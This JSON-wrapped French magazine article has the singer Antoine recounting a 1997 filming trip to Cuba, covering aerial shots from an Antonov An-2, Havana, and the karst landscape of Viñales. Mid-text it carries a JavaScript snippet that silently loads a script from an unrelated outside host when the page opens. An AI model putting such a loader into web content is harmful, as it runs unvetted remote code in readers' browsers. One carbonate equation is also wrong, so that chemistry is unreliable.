{"title": "1997 : Antoine en tournage pour la serie : Iles... etait une fois", "newspaper": "Futura Sciences", "author": ["Antoine"], "date_publi": "2017-11-24", "content": "Cette annee 2017, j'ai realise mon septieme voyage a Cuba : de 1968 a 2017, j'ai visite Cuba en avion, en voilier, et cette annee, a bord d'une de ces magnifiques voitures americaines des annees cinquante qui font desormais partie du patrimoine cubain. Au fil des annees, j'ai vu evoluer cette ile fascinante. A l'occasion de la publication par Warner Home Video de notre film  Cuba est une Fete , je vous propose de revivre avec moi, au cours des semaines a venir, chacun de ces voyage. Aujourd'hui, nous visitons (entre autres), un pays karstique. Mon diplome d'Ingenieur de l'Ecole Centrale en poche, je pensais le completer d'un doctorat a Princeton, mais le bouleversement qu'apporta a ma vie le succes de mes chansons reduisit ce projet a neant, pas plus que je ne pus suivre avec assiduite les cours de Sciences Po et de Nanterre qui me tentaient.  Ce fut meme un miracle que mon emploi du temps frenetique me permette de suivre une autre formation, celle de pilote prive. Ce diplome acquis lui aussi, je revais de faire de grands voyages entre les continents, et d'ile en ile. L'extraordinaire succes, en 1992, de mes premiers documentaires sur les iles, m'en donna l'occasion. Avec un cameraman-pilote de grand talent, Arnaud de Belinay, nous avons ainsi visite par la voie des  airs  les  iles Hawai , celles d'Italie et de Grece. En cette annee 1997, nous avons entrepris, a bord de deux Cessna 172 loues en Floride et aux Bahamas, de survoler les plus belles iles des Grandes Antilles, des iles Vierges aux Bahamas... Mais pas question de survoler  Cuba , car l'ouverture du regime castriste n'a pas encore prevu de s'etendre a l'aviation de plaisance.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'Antonov An-2, avion russe datant de 1947 Une chance cependant : alors que nous preparons ce tournage, l'office du tourisme cubain, qui souhaite decidement attirer en  masse  les visiteurs francais, organise un voyage de presse qui parcourra toute l'ile, a bord en particulier d'un antique Antonov An-2, un venerable  biplan  russe, legendaire, construit depuis 1947 en Ukraine. Des dizaines de ces avions volaient encore dans les annees 1980 pour l'aviation revolutionnaire cubaine. Antonov An-2, un avion de legende. (c) Julian Herzog,  Wikimedia commons,  CC by 4.0                               L'An-2 est le plus gros biplan monomoteur du monde, on en trouve encore en etat de marche de nos jours. Parmi les nombreuses activites qu'il permet (transport de passagers ou de charges, travaux agricoles, travaux  meteo ), il est utilise pour des prises de vues photographiques. C'est ainsi qu'a une epoque ou, bien avant  Google  Maps, le ciel de Cuba etait jalousement garde par le regime castriste, notre chef operateur, Jean-Michel Brisson, a pu survoler une bonne partie de la grande ile de Cuba, mais aussi des innombrables ilots qui bordent sa cote nord, et sur lesquels le tourisme se developpait a une  vitesse  exponentielle. Notre film  Iles... etait une fois les Grandes Antilles  s'est ainsi enrichi d'images aeriennes magnifiques, y compris de Cayo Saetia. Sur les traces d'Hemingway et de Titouan Lamazou Antoine et Titouan Lamazou. (c) Antoine, DR                               Nos petits  Cessna  rendus a leurs proprietaires, je rejoins Jean-Michel, et nous redecouvrons ensemble les regions que j'avais effleurees en 1968 et 1986 : La Havane, ou les batiments qui bordent le Malecon gardent encore quelques traces des  couleurs  vives d'antan.  Hotel Ambos Mundos. (c) Antoine, DR                       Un des premiers batiments renoves est le magnifique hotel Ambos Mundos (<< les Deux Mondes >>) : Hemingway y avait elu domicile en 1929, et dans sa chambre on trouve des  photographies , des trophees de  peche , meme une de ses paires de chaussures. Lors de mon passage, l'hotel accueille un autre tres grand artiste, mon ami le  navigateur , peintre et photographe Titouan Lamazou. Les portraits de Cubains et de Cubaines qu'il realise feront partie d'une fabuleuse exposition qu'il fera quelques annees plus tard au Musee de l'Homme a Paris. Une passion pour le karstique J'avais deja eu l'occasion d'admirer et de filmer des paysages karstiques dans la baie d'Ha Long, dans la region de Phuket en Thailande et, dans les  Grandes Antilles , les Haitises de Republique Dominicaine, et concu une passion pour ces reliefs extraordinaires, nes de l'erosion de  roches sedimentaires , temoignant de ce que ces regions etaient jadis submergees.  Les formations karstiques, appelees << Mogotes >> a Vinales. (c) Antoine, DR                               Cette annee, c'est la premiere fois que je rends visite aux justement celebres << Mogotes >> de la region de Vinales. Le coup de  foudre  est confirme, en particulier dans les nombreuses  grottes  et galeries creusees dans la roche par l'ecoulement des eaux et les reactions entre l'eau (H 2 O), le  gaz  carbonique de l'air (CO 2 ) et la roche (la  calcite , CaCO 3 ) : CO 3  + H 2 O = H 2 CO 3 , H 2 CO 3  = H +  + HCO 3 -  et CaCO 3  + H 2 O + CO 2  = Ca 2+  + HCO 3- . Des langoustes sous haute protection Cette annee-la, Jean-Michel y a tourne une sequence de  peche  a la  langouste  hallucinante, ou les filets des pecheurs ramenent en une seule fois des centaines de ces  crustaces . Mais les pecheurs respectent des reglements stricts, prenant bien soin de les verifier une a une, pour rejeter a la mer les femelles ou celles qui sont trop petites.  Au total, mon sejour cette annee-la, pour le tournage d'une sequence de quatorze minutes sur Cuba sera regrettablement court, j'ai tant de tournages a faire aux quatre coins du monde... Mais  Banana Split , qui m'attend sagement dans la marina d'Oyster Pond a Saint-Martin, me ramenera dans trois ans a peine dans les eaux turquoises des  archipels  du sud de Cuba, je vous raconterai cette croisiere, et l'inquietante rencontre que nous avons faite dans les << Jardins de la Reine >> ! Voir aussi : 1986 : Antoine accoste a Cuba, entre iguanes et recifs coralliens Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  etait fois revolution  |  calcul temps usinage tournage  |  bac 1997  |  mines ponts 1997  |  iles salomons  |  iles des maths  |  iles canaries  |  iles volcanique  |  iles du vanuatu  |  iles crozet", "theme": "planete"}